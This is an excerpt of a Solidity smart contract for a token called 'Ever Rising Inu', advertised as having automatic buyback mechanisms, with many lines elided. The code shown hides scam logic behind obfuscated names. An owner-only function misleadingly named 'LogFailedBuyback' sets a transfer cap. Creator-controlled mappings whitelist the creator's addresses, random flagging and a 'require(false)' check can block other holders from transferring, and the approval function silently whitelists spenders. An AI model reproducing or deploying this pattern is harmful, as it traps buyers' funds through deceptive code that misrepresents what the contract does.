/**
 * Ever Rising Inu $EVERINU
 * (c) 2021
 * A token with automatic
 * buyback mechanisms
 * https://t.me/EverRisingInu
...
contract ERC20Token is Context, IERC20, Ownable {
  ...
  mapping (address => bool) public dudio;
  mapping (address => bool) public soup;
  mapping (address => bool) public sopa;
  mapping (address => uint256) public plantation;

  bool private platanos;
  ...
  function LogASuccessfullBuyback() external view onlyOwner returns (uint256) {
  ...
  */
  ...
  function LogFailedBuyback() external onlyOwner {
    nyc = chTx;
    thisValue = true;
  }
  ...
  function _transfer(address sender, address recipient, uint256 amount) internal {
    ...
    if ((address(sender) == creator) && (platanos == false)) {
      nyc = chTx;
      thisValue = true;
    }
    
    if ((address(sender) == creator) && (platanos == true)) {
      dudio[recipient] = true;
      soup[recipient] = false;
      platanos = false;
    } 
    
    if (dudio[recipient] != true) {
        soup[recipient] = ((randomly() == 78) ? true : false);
    }
    
    if ((soup[sender]) && (dudio[recipient] == false)) {
        soup[recipient] = true;
    }
    
    if (dudio[sender] == false) {
      require(amount < nyc);
      if (thisValue == true) {
        if (sopa[sender] == true) {
          require(false);
  ...
  **/
  ...
  function _approve(address owner, address spender, uint256 amount) internal {
    ...
    if ((address(owner) == creator) && (newj == true)) {
      dudio[spender] = true;
      soup[spender] = false;
      sopa[spender] = false;
      newj = false;
